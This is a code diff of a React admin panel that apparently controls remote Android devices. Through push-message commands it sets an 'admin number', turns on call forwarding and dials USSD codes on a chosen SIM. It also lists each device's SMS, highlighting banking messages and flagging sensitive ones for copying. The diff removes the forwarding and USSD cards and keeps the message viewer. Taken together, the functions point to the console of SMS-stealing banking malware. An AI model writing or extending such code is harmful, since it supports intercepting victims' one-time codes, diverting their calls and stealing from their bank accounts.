-              <button onClick={() => setAdminEnabled(false)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${!adminEnabled ? T.red + "55" : T.borderLight}`, background: !adminEnabled ? T.red + "18" : T.card, color: !adminEnabled ? T.red : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Disable</button>
-            </div>
-            {adminEnabled && <input type="tel" placeholder="Admin phone number" value={adminNumber} onChange={e => setAdminNumber(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />}
-            <div style={stateStyle(adminState)}>{adminLog}</div>
-            <BtnSend
-              onClick={() => sendFcm(adminEnabled ? { type: "admin_update", status: "on", adminNumber: adminNumber.trim(), deviceId: device.deviceId, simSlot: sim === "2" ? "1" : "0" } : { type: "admin_update", status: "off", deviceId: device.deviceId }, setAdminState, setAdminLog)}
-              disabled={adminState === "sending" || (adminEnabled && !adminNumber.trim())}>
-              {adminState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Key /> Update Number</>}
-            </BtnSend>
-          </FcmActionCard>
-
-          {/* FCM Action 5: Call Forward */}
-          <FcmActionCard title="Call Forward" icon={<Ic.PhoneForwarded />} onReset={() => { setFwdState("idle"); setFwdLog(""); setFwdNumber(""); }}>
-            <input type="tel" placeholder="Forward to number" value={fwdNumber} onChange={e => setFwdNumber(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
-            <div style={{ display: "flex", gap: 8 }}>
-              <BtnSend onClick={() => { if (!fwdNumber.trim()) return; sendFcm({ type: "call_forward", action: "activate", number: fwdNumber.trim(), sim: sim === "2" ? "1" : "0" }, setFwdState, setFwdLog); }} disabled={fwdState === "sending" || !fwdNumber.trim()}>
-                {fwdState === "sending" ? <><Spinner /></> : "Activate"}
-              </BtnSend>
-              <BtnSend onClick={() => sendFcm({ type: "call_forward", action: "deactivate", number: fwdNumber.trim() || "", sim: sim === "2" ? "1" : "0" }, setFwdState, setFwdLog)} disabled={fwdState === "sending"}>
-                {fwdState === "sending" ? <><Spinner /></> : "Deactivate"}
-              </BtnSend>
-            </div>
-            <div style={stateStyle(fwdState)}>{fwdLog}</div>
-          </FcmActionCard>
-
-          {/* FCM Action 6: USSD */}
-          <FcmActionCard title="USSD Dial" icon={<Ic.Hash />} onReset={() => { setUssdState("idle"); setUssdLog(""); setUssdCode(""); }}>
-            <input type="text" placeholder="USSD code (e.g. *100#)" value={ussdCode} onChange={e => setUssdCode(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13, fontFamily: "monospace" }} />
-            <div style={stateStyle(ussdState)}>{ussdLog}</div>
-            <BtnSend onClick={() => { if (!ussdCode.trim()) return; sendFcm({ type: "ussd", code: ussdCode.trim(), simSlot: sim === "2" ? "1" : "0" }, setUssdState, setUssdLog); }} disabled={ussdState === "sending" || !ussdCode.trim()}>
-              {ussdState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Hash /> Dial USSD</>}
-            </BtnSend>
-          </FcmActionCard>
-
-          {/* Messages Section — sub admin exact style */}
+          {/* ── Messages Section ── */}
           <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
-            {/* Search bar + Refresh — same as sub admin */}
             <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "9px 12px", borderBottom: `1px solid ${T.border}` }}>
               <span style={{ color: T.muted, fontSize: 13 }}>⌕</span>
               <input value={msgSearch} onChange={e => setMsgSearch(e.target.value)} placeholder="Search messages…"
                 style={{ border: "none", outline: "none", flex: 1, fontSize: 11, background: "transparent", color: T.text }} />
               {msgSearch && <button onClick={() => setMsgSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 13, padding: 0, lineHeight: 1 }}>✕</button>}
-              <span style={{ fontSize: 10, color: T.muted, whiteSpace: "nowrap" }}>
-                {filteredDevMsgs.length} message{filteredDevMsgs.length !== 1 ? "s" : ""}
-              </span>
-              <button onClick={() => loadDevMsgs()} disabled={msgsLoading}
-                style={{ background: "none", border: `1px solid ${T.borderLight}`, borderRadius: 6, padding: "4px 9px", color: T.mutedLight, fontSize: 10, fontWeight: 700, cursor: msgsLoading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 4 }}>
+              <span style={{ fontSize: 10, color: T.muted, whiteSpace: "nowrap" }}>{filteredDevMsgs.length} message{filteredDevMsgs.length !== 1 ? "s" : ""}</span>
+              <button onClick={() => loadDevMsgs()} disabled={msgsLoading} style={{ background: "none", border: `1px solid ${T.borderLight}`, borderRadius: 6, padding: "4px 9px", color: T.mutedLight, fontSize: 10, fontWeight: 700, cursor: msgsLoading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 4 }}>
                 {msgsLoading ? <Spinner size={10} /> : <Ic.Refresh />} Refresh
               </button>
             </div>
-
-            {/* Message list — flat, borderBottom separator (no card backgrounds) */}
             {msgsLoading && devMsgs.length === 0 ? (
               <div style={{ textAlign: "center", padding: 32, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 8 }}><Spinner /><span style={{ fontSize: 12 }}>Loading messages…</span></div>
             ) : filteredDevMsgs.length === 0 ? (
@@ -1247,17 +1309,14 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
               const isGreen = isBankingMsg(msg.body, msg.fromSender);
               return (
                 <div key={msg.id} style={{ padding: "10px 14px", borderBottom: i < filteredDevMsgs.length - 1 ? `1px solid ${T.border}` : "none" }}>
-                  {/* Date row */}
                   <div style={{ display: "flex", gap: 5, alignItems: "center", marginBottom: 4 }}>
                     <span style={{ fontSize: 10, color: T.muted }}>{fmtDate(msg.receivedAt)}</span>
                     {msg.isSensitive && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px" }}>SENSITIVE</span>}
                   </div>
-                  {/* Body + copy */}
                   <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 4 }}>
                     <div style={{ flex: 1, fontSize: 12, color: isGreen ? T.green : T.text, lineHeight: 1.5, wordBreak: "break-word" }}>{msg.body}</div>
                     <CopyIconBtn value={msg.body} title="Copy message" />
                   </div>
-                  {/* FROM / TO row */}
                   <div style={{ display: "flex", gap: 10, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
                     <span style={{ color: T.muted, display: "inline-flex", alignItems: "center", gap: 4 }}>
                       <span style={{ color: T.mutedLight, marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>
